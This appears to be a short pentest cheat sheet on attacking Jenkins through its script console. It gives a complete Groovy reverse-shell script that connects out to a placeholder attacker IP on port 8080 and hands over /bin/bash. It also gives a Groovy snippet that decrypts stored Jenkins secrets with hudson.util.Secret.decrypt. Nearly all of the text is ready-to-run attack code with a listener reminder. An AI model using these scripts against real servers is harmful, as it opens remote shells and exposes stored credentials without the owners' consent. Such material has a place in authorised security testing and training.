# Jenkins

## Reverse Shell via Jenkins

Go to Jenkins script console:

`https://target-jenkins/script`

Execute the following `Groovy` script to send you the reverse shell on port 8080:
```
String host="ATTACKERS-IP-HERE";
int port=8080;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

> Don't forget setting you listener before run the script

## Decoding a Jenkins encripted password

Go to Jenkins script console:

`https://target-jenkins/script`

Execute the following `Groovy` script to decode the encripted information

```
hashed_pw='{ENC_PASS_HERE}'
passwd = hudson.util.Secret.decrypt(hashed_pw)
println(passwd)
```
